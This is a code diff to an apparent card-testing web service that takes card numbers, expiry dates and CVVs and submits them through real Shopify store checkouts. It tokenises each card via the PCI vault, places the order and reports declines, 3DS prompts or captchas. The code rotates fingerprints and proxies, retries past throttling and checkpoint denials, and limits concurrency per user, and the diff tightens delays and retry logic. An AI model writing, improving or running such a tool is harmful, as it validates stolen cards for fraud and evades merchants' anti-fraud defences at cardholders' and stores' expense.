 MUTATION_SUBMIT_SLIM = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename ...on SubmitSuccess{receipt{...SlimReceipt __typename}__typename}...on SubmitAlreadyAccepted{receipt{...SlimReceipt __typename}__typename}...on SubmittedForCompletion{receipt{...SlimReceipt __typename}__typename}...on SubmitFailed{reason __typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}}fragment SlimReceipt on Receipt{__typename ...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}}"""
 
 QUERY_POLL_SLIM = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}}"""
 
-_INTROSPECT_TYPES = (
-    "Merchandise", "ProposalMerchandise", "SourceProvidedMerchandise",
-    "ProductVariantMerchandise", "ContextualizedProductVariantMerchandise",
-    "MissingProductVariantMerchandise", "MerchandiseLine",
-    "MerchandiseBundleLineComponent", "MerchandiseLineComponentWithCapabilities",
-    "LineAllocation", "FilledMerchandiseLineTargetCollection",
-    "RedeemablePaymentMethod", "UiExtensionInstallation", "PaymentLine",
-    "ProductVariantSnapshot", "PurchaseOrderBundleLineComponent",
-    "PurchaseOrderLineComponent", "PurchaseOrderMerchandiseLine",
-    "DiscountTermsV2", "Proposal", "DeliveryTerms", "PaymentTerms",
-    "TaxTerms", "Captcha", "ShopCashRedemptionContent",
-    "StoreCreditRedemptionContent", "CustomerCreditCardPaymentMethod",
-    "PaypalBillingAgreementPaymentMethod", "CompleteDeliveryStrategy",
-    "DeliveryStrategyReference", "Receipt", "PurchaseOrder",
-)
+
+def _check_queries():
+    bad = []
+    for name, q in (("proposal_full", QUERY_PROPOSAL_SHIPPING),
+                    ("proposal_slim", QUERY_PROPOSAL_SLIM),
+                    ("submit_full", MUTATION_SUBMIT),
+                    ("submit_slim", MUTATION_SUBMIT_SLIM),
+                    ("poll_full", QUERY_POLL),
+                    ("poll_slim", QUERY_POLL_SLIM)):
+        if not _gql_balanced(q):
+            bad.append(name)
+            log.error("[QUERY] %s imbalance {=%d }=%d (=%d )=%d",
+                      name, q.count("{"), q.count("}"), q.count("("), q.count(")"))
+    if any(b.endswith("_slim") for b in bad):
+        SLIM["on"] = False
+        log.error("[QUERY] slim queries broken -> FULL forced")
+    return not bad
 
 
+# ── proposal helpers ────────────────────────────────────────────────────────
 def _extract_tax_amount(tax):
     if not tax or not isinstance(tax, dict):
         return None
     if tax.get("__typename") != "FilledTaxTerms":
         return None
-    raw = ((tax.get("totalTaxAmountV2") or {}).get("amount")
-           or ((tax.get("totalTaxAmount") or {}).get("value") or {}).get("amount"))
+    raw = ((tax.get("totalTaxAmount") or {}).get("value") or {}).get("amount")
+    if raw is None:
+        raw = (tax.get("totalTaxAmountV2") or {}).get("amount")
     try:
         return float(raw)
     except (TypeError, ValueError):
@@ -1073,6 +1081,8 @@ def _apply_seller_money(seller, totals):
 def _apply_seller_delivery(seller, ship):
     if not seller or not isinstance(seller, dict):
         return
+    if seller.get("isShippingRequired") is False:
+        ship["requires_shipping"] = False
     d = seller.get("delivery") or {}
     if d.get("__typename") == "FilledDeliveryTerms":
         lines = d.get("deliveryLines") or []
@@ -1100,7 +1110,7 @@ def _apply_seller_delivery(seller, ship):
                         pass
             tm = line.get("targetMerchandise") or {}
             mv2 = tm.get("linesV2") or []
-            if mv2 and (mv2[0].get("merchandise") or {}).get("requiresShipping") is False:
+            if mv2 and ((mv2[0].get("merchandise") or {}).get("requiresShipping") is False):
                 ship["requires_shipping"] = False
     de = seller.get("deliveryExpectations") or {}
     if de.get("__typename") == "FilledDeliveryExpectationTerms":
@@ -1159,14 +1169,12 @@ def _needs_renagotiate(codes):
 def _capture_artifacts(seller, variables):
     if not isinstance(seller, dict):
         return
-
     nnt = seller.get("nonNegotiableTerms")
     if isinstance(nnt, dict) and nnt.get("signature"):
         variables["nonNegotiableTerms"] = {
             "signature": nnt.get("signature"),
             "contents": nnt.get("contents"),
         }
-
     cap = seller.get("captcha")
     if isinstance(cap, dict) and cap.get("__typename") == "Captcha":
         variables["captcha"] = {
@@ -1175,7 +1183,6 @@ def _capture_artifacts(seller, variables):
             "sitekey": cap.get("sitekey"),
             "token": cap.get("token"),
         }
-
     sf = seller.get("scriptFingerprint")
     if isinstance(sf, dict):
         variables["scriptFingerprint"] = {
@@ -1185,7 +1192,6 @@ def _capture_artifacts(seller, variables):
             "paymentScriptChanges": sf.get("paymentScriptChanges") or [],
             "shippingScriptChanges": sf.get("shippingScriptChanges") or [],
         }
-
     tf = seller.get("transformerFingerprintV2")
     if tf:
         variables["transformerFingerprintV2"] = tf
@@ -1193,15 +1199,15 @@ def _capture_artifacts(seller, variables):
 
 def _pending_ms(seller):
     if not isinstance(seller, dict):
-        return 1000
+        return 600
     for k in ("tax", "delivery", "payment", "merchandise"):
         o = seller.get(k) or {}
         if o.get("__typename") == "PendingTerms":
             try:
-                return int(o.get("pollDelay") or 1000)
+                return int(o.get("pollDelay") or 600)
             except (TypeError, ValueError):
-                return 1000
-    return 1000
+                return 600
+    return 600
 
 
 async def _open_checkout(session, url, variant_id, proxy, doc_headers):
@@ -1225,7 +1231,7 @@ async def _open_checkout(session, url, variant_id, proxy, doc_headers):
             last = (cu, text, sst, resp.status)
         except (aiohttp.ClientError, OSError) as e:
             last = (None, f"cart error: {e}", None, 0)
-        await asyncio.sleep(0.15 * (attempt + 1))
+        await asyncio.sleep(0.1 * (attempt + 1))
 
     try:
         await _host_pace(urlparse(url).netloc)
@@ -1251,6 +1257,7 @@ async def _open_checkout(session, url, variant_id, proxy, doc_headers):
         return last
 
 
+# ── core flow ───────────────────────────────────────────────────────────────
 async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                         proxy_str=None, overrides=None, fp=None):
     gateway = "UNKNOWN"
@@ -1258,6 +1265,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
     currency = "USD"
     ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
     ourl = ourl.rstrip("/")
+    site_key = urlparse(ourl).netloc
 
     if fp is None:
         fp = new_fingerprint()
@@ -1269,7 +1277,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
 
     checkpoint = None
     queue_token = None
-    host = urlparse(ourl).netloc
 
     try:
         headers = _checkout_headers(ourl, fp)
@@ -1287,10 +1294,8 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
         state = ai["zoneCode"]
         zipc = ai["postalCode"]
 
-        conn, proxy = build_connector(purl)
-        timeout = aiohttp.ClientTimeout(total=REQ_TOTAL_TIMEOUT, sock_connect=10, sock_read=20)
-
-        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
+        async with _SessCtx(purl) as _sc:
+            session, proxy = _sc.session, _sc.proxy
             url = ourl
 
             if not variant_id:
@@ -1327,20 +1332,21 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             stable_id = extract_stable_id(text) or str(uuid.uuid4())
 
             if not sst:
-                if "password" in text.lower() and ("enter" in text.lower() or "store" in text.lower()):
+                low = text.lower()
+                if "password" in low and ("enter" in low or "store" in low):
                     return False, "Site is password protected", gateway, total_price, currency, pstat
                 return False, "CHECKOUT_SESSION_FAILED", gateway, total_price, currency, pstat
-
-            merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
-                     or extract_between(text, "ProductVariantMerchandise/", "&q")
-                     or extract_between(raw, "ProductVariantMerchandise/", '"')
-                     or str(variant_id))
 
             currency = "USD"
             if "currencyCode&quot;:&quot;" in text:
                 currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
             elif '"currencyCode":"' in raw:
                 currency = extract_between(raw, '"currencyCode":"', '"') or "USD"
+
+            merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
+                     or extract_between(text, "ProductVariantMerchandise/", "&q")
+                     or extract_between(raw, "ProductVariantMerchandise/", '"')
+                     or str(variant_id))
 
             build_id = None
             bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', raw)
@@ -1385,7 +1391,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             if source_token:
                 headers["x-checkout-web-source-id"] = source_token
 
-            gql_host = urlparse(checkout_url).netloc or host
+            gql_host = urlparse(checkout_url).netloc or site_key
             gql_url = f"https://{gql_host}/checkouts/unstable/graphql"
             params = {"operationName": "Proposal"}
 
@@ -1458,7 +1464,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 "optionalDuties": {"buyerRefusesDuties": False},
             }
 
-            json_data = {"query": _q(QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_SLIM),
+            json_data = {"query": _q_for(site_key, QUERY_PROPOSAL_SHIPPING, QUERY_PROPOSAL_SLIM),
                          "variables": variables, "operationName": "Proposal"}
 
             _cands = _country_candidates(ourl, currency, overrides)
@@ -1478,7 +1484,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                                        json=json_data, proxy=proxy)
                 rt = await r.text()
                 if _schema_drift(rt):
-                    SLIM["on"] = True
                     return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
                 if is_captcha(rt):
                     return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
@@ -1490,8 +1495,9 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                     return False, _nonjson_code(r.status, rt), gateway, total_price, currency, pstat
                 if "errors" in rj and not rj.get("data"):
                     msgs = "; ".join(e.get("message", str(e)) for e in rj["errors"][:3])
-                    log.warning("proposal gql error: %s | loc=%s", msgs,
-                                [e.get("locations") for e in rj["errors"][:3]])
+                    log.warning("proposal gql error: %s", msgs)
+                    if "syntax error" in msgs.lower():
+                        return False, "GRAPHQL_SYNTAX", gateway, total_price, currency, pstat
                     return False, f"GraphQL Error: {msgs}", gateway, total_price, currency, pstat
 
                 try:
@@ -1580,7 +1586,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                                    json=json_data, proxy=proxy)
             rt = await r.text()
             if _schema_drift(rt):
-                SLIM["on"] = True
                 return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
             if is_captcha(rt):
                 return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
@@ -1608,7 +1613,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             requires_shipping = ship["requires_shipping"]
 
             if requires_shipping and (tax_type == "PendingTerms" or not delivery_strategy):
-                await asyncio.sleep(min(_pending_ms(dseller), 1500) / 1000.0)
+                await asyncio.sleep(min(_pending_ms(dseller), 600) / 1000.0)
                 if requires_shipping and delivery_strategy:
                     variables["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = \
                         _delivery_strategy_input(True, delivery_strategy)
@@ -1618,7 +1623,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                                            json=json_data, proxy=proxy)
                     rt3 = await r.text()
                     if _schema_drift(rt3):
-                        SLIM["on"] = True
                         return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
                     dj2 = json.loads(rt3)
                     dres2 = dj2.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
@@ -1667,35 +1671,35 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                     "verification_value": cvv, "start_month": None, "start_year": None,
                     "issue_number": "", "name": f"{fn} {ln}",
                 },
-                "payment_session_scope": urlparse(url).netloc,
+                "payment_session_scope": site_key,
             }
 
             token = None
-            seq = []
-            for p in (proxy, _rotate_proxy(proxy), None):
-                if p not in seq:
-                    seq.append(p)
-            for pxy in seq:
-                for _try in range(2):
-                    try:
-                        await _host_pace("checkout.pci.shopifyinc.com")
-                        rr = await session.post(pci_url, json=payload,
-                                                headers=vault_headers, proxy=pxy)
-                        vt = await rr.text()
-                        if rr.status in (429, 430, 503):
-                            _pcool_mark(pxy)
-                            _cooldown_proxy(pxy)
-                            await asyncio.sleep(0.25)
-                            continue
-                        if vt.strip().startswith("{"):
-                            token = json.loads(vt).get("id")
-                        if token:
-                            break
-                    except Exception:
-                        _cooldown_proxy(pxy)
-                        await asyncio.sleep(0.15)
+            for rawp in (proxy_str, None):
+                pr = parse_proxy(rawp) if rawp else None
+                if rawp == proxy_str:
+                    vsess, vproxy = session, proxy
+                else:
+                    ctx = _SessCtx(pr)
+                    _vs = await ctx.__aenter__()
+                    vsess, vproxy = _vs.session, _vs.proxy
+                try:
+                    await _host_pace("checkout.pci.shopifyinc.com")
+                    rr = await vsess.post(pci_url, json=payload,
+                                          headers=vault_headers, proxy=vproxy)
+                    vt = await rr.text()
+                    if rr.status in (429, 430, 503):
+                        _pcool_mark(rawp)
+                        _cooldown_proxy(rawp)
                         continue
+                    if vt.strip().startswith("{"):
+                        token = json.loads(vt).get("id")
+                except Exception:
+                    _cooldown_proxy(rawp)
+                    continue
                 if token:
+                    break
+                if not proxy_str:
                     break
             if not token:
                 return False, "PCI_TOKEN_FAILED", gateway, total_price, currency, pstat
@@ -1802,8 +1806,8 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             sub_vars = _build_sub_vars(f"{attempt}-{rand_str()}")
             rid = None
 
-            for submit_try in range(3):
-                sub_json = {"query": _q(MUTATION_SUBMIT, MUTATION_SUBMIT_SLIM),
+            for submit_try in range(2):
+                sub_json = {"query": _q_for(site_key, MUTATION_SUBMIT, MUTATION_SUBMIT_SLIM),
                             "variables": sub_vars,
                             "operationName": "SubmitForCompletion"}
                 await _host_pace(gql_host)
@@ -1811,7 +1815,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                                        json=sub_json, proxy=proxy)
                 text = await r.text()
                 if _schema_drift(text):
-                    SLIM["on"] = True
                     return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
                 if is_captcha(text):
                     return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
@@ -1832,6 +1835,9 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                         c = e.get("code") or (e.get("extensions") or {}).get("code")
                         if c and c != "INVALID_VARIABLE":
                             return False, c, gateway, total_price, currency, pstat
+                    msgs = "; ".join(e.get("message", "") for e in sj.get("errors", [])[:2])
+                    if "syntax error" in msgs.lower():
+                        return False, "GRAPHQL_SYNTAX", gateway, total_price, currency, pstat
                     return False, f"Empty submit (HTTP {r.status})", gateway, total_price, currency, pstat
 
                 rtype = sub.get("__typename", "")
@@ -1840,14 +1846,13 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                     errs = sub.get("errors") or []
                     codes = [e.get("code") for e in errs if e.get("code")]
 
-                    if (_needs_renagotiate(codes) or _reject_needs_accept(codes)) and submit_try < 2:
+                    if (_needs_renagotiate(codes) or _reject_needs_accept(codes)) and submit_try < 1:
                         try:
                             await _host_pace(gql_host)
                             rr = await session.post(gql_url, params=params, headers=headers,
                                                     json=json_data, proxy=proxy)
                             rt4 = await rr.text()
                             if _schema_drift(rt4):
-                                SLIM["on"] = True
                                 return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
                             rj2 = json.loads(rt4)
                             res2 = rj2["data"]["session"]["negotiate"]["result"]
@@ -1885,13 +1890,13 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                     return False, "Submit Rejected", gateway, total_price, currency, pstat
 
                 if rtype == "Throttled":
-                    if submit_try < 2:
-                        await asyncio.sleep(min((sub.get("pollAfter") or 800) / 1000.0, 3.0))
+                    if submit_try < 1:
+                        await asyncio.sleep(min((sub.get("pollAfter") or 600) / 1000.0, 2.0))
                         continue
                     return False, "Throttled", gateway, total_price, currency, pstat
 
                 if rtype == "CheckpointDenied":
-                    if submit_try < 2:
+                    if submit_try < 1:
                         try:
                             await _host_pace(gql_host)
                             rr = await session.post(gql_url, params=params, headers=headers,
@@ -1949,16 +1954,15 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 return False, "No receipt after submit", gateway, total_price, currency, pstat
 
             poll_params = {"operationName": "PollForReceipt"}
-            poll_json = {"query": _q(QUERY_POLL, QUERY_POLL_SLIM),
+            poll_json = {"query": _q_for(site_key, QUERY_POLL, QUERY_POLL_SLIM),
                          "variables": {"receiptId": rid, "sessionToken": sst},
                          "operationName": "PollForReceipt"}
-            for _ in range(5):
+            for _ in range(6):
                 await _host_pace(gql_host)
                 r = await session.post(gql_url, params=poll_params, headers=headers,
                                        json=poll_json, proxy=proxy)
                 ft = await r.text()
                 if _schema_drift(ft):
-                    SLIM["on"] = True
                     return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
                 if r.status in (429, 430, 503):
                     return False, "RATE_LIMITED", gateway, total_price, currency, pstat
@@ -1987,7 +1991,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 if tn == "ActionRequiredReceipt":
                     return False, "3DS_REQUIRED", gateway, total_price, currency, pstat
                 if tn in ("ProcessingReceipt", "WaitingReceipt"):
-                    await asyncio.sleep(min((rd.get("pollDelay", 400) or 400) / 1000.0, POLL_MAX_SLEEP))
+                    await asyncio.sleep(min((rd.get("pollDelay", 300) or 300) / 1000.0, POLL_MAX_SLEEP))
                     continue
                 return False, f"UNHANDLED_{tn}", gateway, total_price, currency, pstat
             return False, "STILL_PROCESSING", gateway, total_price, currency, pstat
@@ -2007,11 +2011,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None,
     captcha_budget = CAPTCHA_RETRY
     net_budget = NET_RETRIES
     rl_budget = RL_RETRIES
-    drift_budget = 3
+    drift_budget = 2
+    site_key = urlparse(site_url if site_url.startswith("http")
+                        else "https://" + site_url).netloc
     cur_proxy = proxy_str
     last = None
 
-    total_iters = retries + captcha_budget + net_budget + rl_budget + 8
+    total_iters = min(retries + captcha_budget + net_budget + rl_budget + 2, 6)
     for attempt in range(total_iters):
         fp = new_fingerprint()
         await _rl_wait()
@@ -2028,17 +2034,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None,
 
         msg = res[1]
 
-        if msg == "SCHEMA_DRIFT" and drift_budget > 0:
+        if msg in ("SCHEMA_DRIFT", "GRAPHQL_SYNTAX") and drift_budget > 0:
             drift_budget -= 1
-            SLIM["on"] = True
+            nv = _flip_variant(site_key)
             _bump("drift")
-            log.warning("schema drift detected -> SLIM mode on")
+            log.warning("variant drift on %s -> %s", site_key, nv)
             continue
 
         if _is_captcha_msg(msg) and captcha_budget > 0:
             captcha_budget -= 1
-            cur_proxy = _rotate_proxy(cur_proxy) or cur_proxy
-            await asyncio.sleep(0.5 + random.random() * 0.8)
+            await asyncio.sleep(0.2 + random.random() * 0.3)
             continue
 
         if _is_rate_limited_msg(msg) and rl_budget > 0:
@@ -2046,20 +2051,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             _pcool_mark(cur_proxy)
             _cooldown_proxy(cur_proxy)
             _rl_pause()
-            cur_proxy = _rotate_proxy(cur_proxy) or cur_proxy
-            await asyncio.sleep(0.4 + random.random() * 0.6)
+            await asyncio.sleep(0.25 + random.random() * 0.35)
             continue
 
         if _is_net_err(msg) and net_budget > 0:
             net_budget -= 1
             _cooldown_proxy(cur_proxy)
             _mark_proxy_fail(cur_proxy)
-            cur_proxy = _rotate_proxy(cur_proxy) or cur_proxy
-            await asyncio.sleep(0.2 + random.random() * 0.4)
+            await asyncio.sleep(0.1 + random.random() * 0.15)
             continue
 
         if _is_retryable(msg) and attempt < total_iters - 1:
-            await asyncio.sleep(0.25 * (2 ** min(attempt, 3)))
+            await asyncio.sleep(0.15 * (2 ** min(attempt, 2)))
             continue
 
         return res
@@ -2067,10 +2070,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None,
     return last
 
 
+# ── concurrency ─────────────────────────────────────────────────────────────
 _global_sem = None
 _user_sems = {}
-_start_gate_lock = None
-_last_start = 0.0
 
 STATS = {"total": 0, "ok": 0, "captcha": 0, "declined": 0, "drift": 0,
          "started": time.time()}
@@ -2083,25 +2085,6 @@ def _sem():
     return _global_sem
 
 
-def _gate_lock():
-    global _start_gate_lock
-    if _start_gate_lock is None:
-        _start_gate_lock = asyncio.Lock()
-    return _start_gate_lock
-
-
-async def _admit():
-    global _last_start
-    if START_STAGGER <= 0:
-        return
-    async with _gate_lock():
-        now = time.time()
-        wait = START_STAGGER - (now - _last_start)
-        if wait > 0:
-            await asyncio.sleep(wait)
-        _last_start = time.time()
-
-
 async def _throttled(cc, mes, ano, cvv, site, variant, proxy, user_key="default",
                      overrides=None, max_retries=None):
     us = _user_sems.get(user_key)
@@ -2109,7 +2092,6 @@ async def _throttled(cc, mes, ano, cvv, site, variant, proxy, user_key="default"
         us = _user_sems[user_key] = asyncio.Semaphore(PER_USER_CONCUR)
     async with us:
         async with _sem():
-            await _admit()
             return await process_card(cc, mes, ano, cvv, site, variant, proxy,
                                       max_retries, overrides)
 
@@ -2211,60 +2193,6 @@ def _int_or_none(v):
         return None
 
 
-async def probe_schema(site_url, variant_id=None, proxy_str=None):
-    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
-    ourl = ourl.rstrip("/")
-    purl = parse_proxy(proxy_str) if proxy_str else None
-    fp = new_fingerprint()
-    out = {"site": ourl, "missing_types": [], "present_types": [],
-           "session": False, "slim_active": SLIM["on"], "error": None}
-    conn, proxy = build_connector(purl)
-    timeout = aiohttp.ClientTimeout(total=REQ_TOTAL_TIMEOUT, sock_connect=10, sock_read=20)
-    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
-        if not variant_id:
-            variant_id = _cache_get(ourl)
-        if not variant_id:
-            info = await fetch_products(ourl, proxy_str, session=session,
-                                        request_proxy=proxy, fp=fp)
-            if isinstance(info, tuple) and info[0] is False:
-                out["error"] = info[1]
-                return out
-            variant_id = info["variant_id"]
-            _cache_set(ourl, variant_id)
-        doc_headers = _document_headers(ourl, fp)
-        cu, text, sst, status = await _open_checkout(session, ourl, variant_id, proxy, doc_headers)
-        if not sst:
-            out["error"] = f"no session token (status {status})"
-            return out
-        out["session"] = True
-        headers = _checkout_headers(ourl, fp)
-        headers["x-checkout-one-session-token"] = sst
-        gql_host = urlparse(cu).netloc or urlparse(ourl).netloc
-        url = f"https://{gql_host}/checkouts/unstable/graphql"
-        r = await session.post(url, headers=headers, proxy=proxy,
-                               json={"query": "{__schema{types{name}}}"})
-        txt = await r.text()
-        if is_captcha(txt):
-            out["error"] = "CAPTCHA_REQUIRED"
-            return out
-        try:
-            data = json.loads(txt)
-        except json.JSONDecodeError:
-            out["error"] = f"introspection non-json (HTTP {r.status}): {txt[:200]}"
-            return out
-        schema = (data.get("data") or {}).get("__schema") or {}
-        types = {t.get("name") for t in schema.get("types") or []}
-        if not types:
-            out["error"] = f"introspection empty: {txt[:300]}"
-            return out
-        for t in _INTROSPECT_TYPES:
-            (out["present_types"] if t in types else out["missing_types"]).append(t)
-        if out["missing_types"]:
-            SLIM["on"] = True
-            out["slim_forced"] = True
-    return out
-
-
 routes = web.RouteTableDef()
 
 
@@ -2273,7 +2201,6 @@ async def health(request):
     return web.json_response({
         "status": "ok", "engine": "aiohttp", "port": PORT,
         "global_max": GLOBAL_MAX_CONCUR, "per_user": PER_USER_CONCUR,
-        "seen_proxies": len(_SEEN_LIST), "pool_file": len(PROXY_POOL),
         "mode": "slim" if SLIM["on"] else "full", "Dev": DEV,
     }, dumps=_dumps)
 
@@ -2284,23 +2211,15 @@ async def status(request):
         "status": "online",
         "engine": "aiohttp.web",
         "query_mode": "slim" if SLIM["on"] else "full",
-        "slim_env": SLIM_MODE,
         "global_max": GLOBAL_MAX_CONCUR,
         "per_user": PER_USER_CONCUR,
         "active_users": len(_user_sems),
-        "seen_proxies": len(_SEEN_LIST),
-        "proxies_txt_pool": len(PROXY_POOL),
+        "open_sessions": len(_SESSIONS),
         "cached_sites": len(_SITE_CACHE),
-        "rotate": ROTATE,
-        "force_close": FORCE_CLOSE,
-        "fingerprint_mode": FINGERPRINT_MODE,
+        "variant_overrides": len(_SITE_VARIANT),
         "rl_pause_until": round(_RL_PAUSE_UNTIL, 2),
         "Dev": DEV,
-        "endpoints": {
-            "single": "GET /shopify?card=CARD|MM|YYYY|CVV&site=DOMAIN&proxy=host:port",
-            "probe": "GET /probe?site=DOMAIN",
-            "stats": "GET /stats",
-        },
+        "endpoint": "GET /shopify?card=CARD|MM|YYYY|CVV&site=DOMAIN&proxy=host:port",
     }, dumps=_dumps)
 
 
@@ -2308,29 +2227,8 @@ async def status(request):
 async def stats(request):
     s = dict(STATS)
     s["uptime_sec"] = round(time.time() - s.get("started", time.time()), 1)
-    s["seen_proxies"] = len(_SEEN_LIST)
     s["Dev"] = DEV
     return web.json_response(s, dumps=_dumps)
-
-
-@routes.get("/probe")
-async def probe(request):
-    q = request.query
-    site = q.get("site")
-    if not site:
-        return web.json_response({"error": "Missing 'site'", "Dev": DEV}, status=400)
-    px = _pick_proxy(q.get("proxy")) or _auto_proxy()
-    if px:
-        purl = parse_proxy(px)
-        if purl:
-            _seen_proxy(purl)
-    try:
-        out = await probe_schema(site, q.get("variant"), px)
-    except Exception as e:
-        return web.json_response({"error": str(e), "Dev": DEV}, status=500)
-    out["dead_count"] = len(out["missing_types"])
-    out["Dev"] = DEV
-    return web.json_response(out, dumps=_dumps)
 
 
 @routes.get("/shopify")
@@ -2343,12 +2241,6 @@ async def shopify(request):
         site = q.get("site")
         card_in = q.get("card") or q.get("cc") or ""
         raw_proxy = _pick_proxy(q.get("proxy"))
-        if not raw_proxy:
-            raw_proxy = _auto_proxy()
-        if raw_proxy:
-            purl = parse_proxy(raw_proxy)
-            if purl:
-                _seen_proxy(purl)
 
         user_key = q.get("key", "default")
         variant = q.get("variant")
@@ -2406,14 +2298,18 @@ def build_app():
     async def _on_start(app_):
         _sem()
         _check_queries()
-        log.info("[ENGINE] port=%s global=%s per_user=%s rotate=%s force_close=%s "
-                 "fp=%s slim=%s net_retry=%s rl_retry=%s connect_retry=%s pool_file=%s dev=%s",
-                 PORT, GLOBAL_MAX_CONCUR, PER_USER_CONCUR, ROTATE, FORCE_CLOSE,
-                 FINGERPRINT_MODE, SLIM["on"], NET_RETRIES, RL_RETRIES,
-                 CONNECT_RETRY, len(PROXY_POOL), DEV)
+        log.info("[ENGINE] port=%s global=%s per_user=%s mode=%s timeout=%s dev=%s",
+                 PORT, GLOBAL_MAX_CONCUR, PER_USER_CONCUR,
+                 "slim" if SLIM["on"] else "full", REQ_TOTAL_TIMEOUT, DEV)
 
     async def _on_clean(app_):
         _prune_cooldowns()
+        for k, ent in list(_SESSIONS.items()):
+            _SESSIONS.pop(k, None)
+            try:
+                await ent[0].close()
+            except Exception:
+                pass
 
     app.on_startup.append(_on_start)
     app.on_cleanup.append(_on_clean)
